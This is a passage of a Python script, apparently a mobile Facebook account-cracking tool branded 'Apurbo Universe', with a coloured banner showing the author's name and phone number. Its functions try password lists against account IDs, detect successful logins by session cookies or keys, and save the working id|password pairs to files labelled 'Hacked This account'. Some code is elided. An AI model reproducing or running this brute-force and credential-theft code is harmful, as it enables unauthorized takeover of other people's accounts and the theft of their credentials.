...
os.system('xdg-open https://www.facebook.com/iloveyou8647/')
print('\n\033[1;37m Welcome apurbo universe...\n It will take some seconds...')
...
logo=("""'
 ...
 \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
  \033[1;96m ─────────────•◈•──────────  
   \033[1;92m███████▒▒Welcome To Apurbo Universe ▒▒████████
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mTech With Apurbo \033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;94mAuthor\033[1;91m: \033[1;91Tech With Apurbo 
\033[1;94mCreator Apurbo \033[1;91m: \033[1;91▒▓██████████████]99.9 
\033[1;94mWhatsapp(Don't call me)\033[1;91m: \033[1;91m+8801706357376
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mTech With Apurbo \033[1;95m♡╰──────────•◈•──────────╯♡'
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Apurbo] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Prince:
                                ...
                                print('\r\r\033[1;32m [Apurbo Hacked This account ] %s | %s'%(ids,pas))
                                open('/sdcard/Apurbo Hacked This account .txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Prince:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Apurbo need apruval ] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Apurbo need apruval .txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Apurbo Hacked This account ] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Apurbo Hacked This account .txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Apurbo Hacked This account .txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Apurbo Hacked This account ] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Apurbo Hacked This account .txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Apurbo Hacked This account ] '+uid+' | '+pas+'\033[1;97m')
